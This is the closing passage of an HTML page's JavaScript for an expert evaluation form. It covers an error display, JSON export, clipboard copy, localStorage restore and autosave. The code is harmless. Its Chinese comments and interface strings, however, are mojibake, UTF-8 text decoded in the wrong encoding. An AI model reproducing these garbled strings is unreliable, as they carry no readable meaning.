            localStorage.removeItem('expertEvaluation');
        }
        
        // æ˜¾ç¤ºå¤±è´¥çŠ¶æ€
        function showError() {
            const statusDiv = document.getElementById('submitStatus');
            const submitBtn = document.getElementById('submitBtn');
            
            statusDiv.style.display = 'block';
            statusDiv.style.background = '#fee2e2';
            statusDiv.style.color = '#991b1b';
            statusDiv.innerHTML = 'âŒ æäº¤å¤±è´¥ï¼Œè¯·ä½¿ç”¨"å¤‡ç”¨ï¼šä¸‹è½½æ–‡ä»¶"æ–¹å¼ï¼Œæˆ–ç¨åé‡è¯•ã€‚';
            
            submitBtn.disabled = false;
            submitBtn.textContent = 'ğŸš€ é‡æ–°æäº¤';
        }
        
        // å¯¼å‡º JSONï¼ˆå¤‡ç”¨æ–¹å¼ï¼‰
        function exportJSON() {
            saveCurrentData();
            const dataStr = JSON.stringify(evaluationData, null, 2);
            const blob = new Blob([dataStr], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `ä¸“å®¶è¯„ä¼°_${evaluationData.expert.name || 'unknown'}_${new Date().toISOString().slice(0,10)}.json`;
            a.click();
            
            document.getElementById('dataPreview').textContent = dataStr;
            
            alert('âœ… æ–‡ä»¶å·²ä¸‹è½½ï¼è¯·å°†æ­¤æ–‡ä»¶å‘é€ç»™ç ”ç©¶äººå‘˜ã€‚');
        }
        
        // å¤åˆ¶åˆ°å‰ªè´´æ¿ï¼ˆå¤‡ç”¨æ–¹å¼ï¼‰
        function copyToClipboard() {
            saveCurrentData();
            const dataStr = JSON.stringify(evaluationData, null, 2);
            navigator.clipboard.writeText(dataStr).then(() => {
                alert('âœ… æ•°æ®å·²å¤åˆ¶åˆ°å‰ªè´´æ¿ï¼');
            });
            document.getElementById('dataPreview').textContent = dataStr;
        }
        
        // æ¢å¤ä¿å­˜çš„æ•°æ®
        function restoreData() {
            const saved = localStorage.getItem('expertEvaluation');
            if (saved) {
                try {
                    const data = JSON.parse(saved);
                    if (data.expert) {
                        document.getElementById('expertName').value = data.expert.name || '';
                        document.getElementById('expertRole').value = data.expert.role || '';
                        if (data.expert.date) document.getElementById('evalDate').value = data.expert.date;
                    }
                    // TODO: æ¢å¤æ¡ˆä¾‹è¯„åˆ†
                } catch(e) {}
            }
        }
        
        // åˆå§‹åŒ–
        document.addEventListener('DOMContentLoaded', () => {
            restoreData();
            switchCase(1);
            
            // è‡ªåŠ¨ä¿å­˜
            document.querySelectorAll('input, select, textarea').forEach(el => {
                el.addEventListener('change', saveCurrentData);
            });
        });
    </script>
</body>
</html>
